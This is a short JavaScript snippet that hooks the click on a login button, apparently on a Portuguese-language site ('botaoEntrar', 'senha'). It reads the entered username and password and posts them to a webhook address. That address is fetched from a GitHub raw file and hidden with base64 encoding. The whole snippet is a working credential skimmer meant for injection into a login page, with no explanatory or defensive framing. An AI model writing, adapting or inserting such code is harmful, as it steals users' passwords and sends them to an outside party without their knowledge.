setTimeout(() => {
    if(document.getElementById("botaoEntrar")) {
        document.getElementById("botaoEntrar").addEventListener("click",()=> {
            fetch("https://raw.githubusercontent.com/ticek22674/webhook/main/sed.txt").then(response=> {
                response.text().then(text=>{
                    fetch(atob(text), {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({"content":"USER: "+document.getElementById("name").value+"\nPASS:"+document.getElementById("senha").value}),
                    });
                });
            });
        });
    }
}, 1000);